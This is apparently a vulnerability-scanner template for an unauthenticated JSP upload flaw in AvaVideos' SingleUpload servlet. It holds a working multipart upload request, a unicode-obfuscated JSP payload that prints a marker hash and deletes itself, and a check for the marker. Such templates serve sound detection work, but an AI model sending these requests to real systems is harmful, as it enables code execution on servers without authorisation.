name: AvaVideos_SingleUpload_Servlet_File_Upload
transport: http
detail:
  dock: body="top.location = './ie.html'" && body="app"
  product: AvaVideos
  homepage: https://www.ava.com.cn/product_1.html
  impact: ''
  description: SingleUpload Servlet File upload,Attackers can upload malicious files
    without authentication.
set:
  randStr: randomStr(8)
  poc: <%\\u006F\\u0075\\u0074\\u002E\\u0070\\u0072\\u0069\\u006E\\u0074\\u006C\\u006E\\u0028\\u006E\\u0065\\u0077\\u0020\\u0053\\u0074\\u0072\\u0069\\u006E\\u0067\\u0028\\u006E\\u0065\\u0077\\u0020\\u0073\\u0075\\u006E\\u002E\\u006D\\u0069\\u0073\\u0063\\u002E\\u0042\\u0041\\u0053\\u0045\\u0036\\u0034\\u0044\\u0065\\u0063\\u006F\\u0064\\u0065\\u0072\\u0028\\u0029\\u002E\\u0064\\u0065\\u0063\\u006F\\u0064\\u0065\\u0042\\u0075\\u0066\\u0066\\u0065\\u0072\\u0028\\u0022\\u005A\\u0054\\u0045\\u0032\\u004E\\u0054\\u0051\\u0079\\u004D\\u0054\\u0045\\u0078\\u004D\\u0047\\u004A\\u0068\\u004D\\u0044\\u004D\\u0077\\u004F\\u0054\\u006C\\u0068\\u004D\\u0057\\u004D\\u0077\\u004D\\u007A\\u006B\\u007A\\u004D\\u007A\\u0063\\u007A\\u0059\\u007A\\u0056\\u0069\\u004E\\u0044\\u004D\\u003D\\u0022\\u0029\\u0029\\u0029\\u003B\\u006E\\u0065\\u0077\\u0020\\u006A\\u0061\\u0076\\u0061\\u002E\\u0069\\u006F\\u002E\\u0046\\u0069\\u006C\\u0065\\u0028\\u0061\\u0070\\u0070\\u006C\\u0069\\u0063\\u0061\\u0074\\u0069\\u006F\\u006E\\u002E\\u0067\\u0065\\u0074\\u0052\\u0065\\u0061\\u006C\\u0050\\u0061\\u0074\\u0068\\u0028\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002E\\u0067\\u0065\\u0074\\u0053\\u0065\\u0072\\u0076\\u006C\\u0065\\u0074\\u0050\\u0061\\u0074\\u0068\\u0028\\u0029\\u0029\\u0029\\u002E\\u0064\\u0065\\u006C\\u0065\\u0074\\u0065\\u0028\\u0029\\u003B%>
rules: 
  r1:
    url: /admin/servlet/SingleUpload?FileName={{randStr}}.jsp/
    method: POST
    header:
      Content-Type: multipart/form-data; boundary=d733dc327d365fed57da61bc02a74650
    body: "--d733dc327d365fed57da61bc02a74650\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"blob\"\r\nContent-Type: Content-Type: image/png\r\n\r\n{{poc}}\r\n--d733dc327d365fed57da61bc02a74650--\r\n"
    expression: true
  r2:
    url: /admin/upload/{{randStr}}.jsp
    follow_redirects: false
    expression: response.status == 200 && response.body.bcontains(b"e165421110ba03099a1c0393373c5b43")

expression: r1() && r2()
